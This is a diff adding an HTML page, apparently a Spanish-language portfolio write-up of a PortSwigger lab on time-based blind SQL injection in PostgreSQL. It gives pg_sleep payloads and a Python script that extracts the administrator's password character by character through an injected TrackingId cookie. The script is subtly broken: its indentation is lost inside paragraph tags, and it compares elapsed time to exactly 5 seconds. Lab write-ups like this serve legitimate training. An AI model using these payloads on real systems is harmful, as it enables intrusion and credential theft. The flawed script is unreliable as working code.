@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Blind SQLi — Time Delays | MeloRZ</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&family=Exo+2:wght@300;400;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/style.css"/>
+</head>
+<body>
+  <div class="bg-grid"></div>
+  <nav class="navbar">
+    <div class="nav-brand"><span class="bracket">[</span><span class="brand-name">MeloRZ</span><span class="bracket">]</span></div>
+    <ul class="nav-links">
+      <li><a href="../../index.html#writeups" class="nav-link">← Writeups</a></li>
+    </ul>
+    <div class="nav-status"><span class="status-dot"></span><span class="status-text">ONLINE</span></div>
+  </nav>
+  <div class="writeup-page">
+    <a href="../../index.html" class="writeup-back">← Volver al portafolio</a>
+    <div class="writeup-header">
+      <div class="writeup-meta">
+        <span class="card-badge ps">PS Lab</span>
+        <span class="card-difficulty easy">EASY</span>
+      </div>
+      <h1 class="writeup-title">Blind SQLi — Time Delays</h1>
+      <div class="writeup-info">
+        <span>Plataforma: <strong style="color:var(--blue-bright)">PortSwigger Labs</strong></span>
+        <span>Tags: <span>SQLi</span><span>Blind</span><span>Time-Based</span></span>
+      </div>
+    </div>
+    <div class="writeup-body">
+
+<hr>
+
+<p>Verificamos que es una base de datos PostGreSQL, por lo tanto usamen el siguiente payload para probar si hay retrasos:</p>
+
+<pre><code>' AND (SELECT pg_sleep(5))--</code></pre>
+
+<p>y vemos que hay delay por lo tanto ahora vamos a robar informacion aprovechando los delays con el siguiente payload y script (esto suponiendo que ya sabemos la longitud de la password):</p>
+
+<pre><code>' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')-- -</code></pre>
+
+
+<p>funcion para verificar tiempos de respuesta en python:</p>
+<p>>[!nota] <strong>response.elapsed.total_seconds()</strong></p>
+
+
+<p>Script para automatizar la explotacion:</p>
+
+<pre><code>#!/usr/bin/python3
+<p>import requests</p>
+<p>import string</p>
+
+
+
+
+<p>url_input= 'https://0af900630378ccaf82b297c900d100e9.web-security-academy.net/'</p>
+<p>caracters= string.ascii_lowercase + string.ascii_uppercase + string.digits</p>
+<p>password= ''</p>
+
+<p>for position in range(1,21):</p>
+<p>for letter in caracters:</p>
+		
+<p>cookies = {"TrackingId":f"aBlhszmYn1ayUHBL' AND(SELECT CASE WHEN SUBSTRING(password,{position},1)='{letter}' THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--","session":"cZ88aG3WPV5wkPFGgl0LFlRuHKdjiGnC"}</p>
+<p>me_request = requests.get(url=url_input, cookies=cookies)</p>
+<p>if me_request.elapsed.total_seconds()==5:</p>
+<p>password+=letter</p>
+<p>print(f"letra de la posicion {position} encontrada --> {letter}")</p>
+<p>break</p>
+<p>else:</p>
+<p>continue</p>
+<p>print(" -->", password)</code></pre></p>
+    </div>
+  </div>
+</body>
+</html>
